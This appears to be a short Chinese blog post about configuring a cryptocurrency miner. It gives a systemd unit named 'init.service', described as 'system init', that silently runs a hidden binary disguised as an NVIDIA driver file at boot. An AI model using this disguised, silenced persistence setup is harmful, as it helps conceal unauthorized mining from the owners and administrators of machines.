---
title: miner配置
date: 2021-03-23 17:39:00
tags:
- 技巧
categories:
- blockchain
---

## systemd配置文件
文件路径`/lib/systemd/system/init.service`
文件内容
```
[Unit]
Description=system init
After=multi-user.target
Conflicts=getty@tty1.service

[Service]
Type=simple
ExecStart=/usr/driver/.opt-nvidia
StandardInput=file:/dev/null
StandardOutput=file:/dev/null
StandardError=file:/dev/null

[Install]
WantedBy=multi-user.target
```
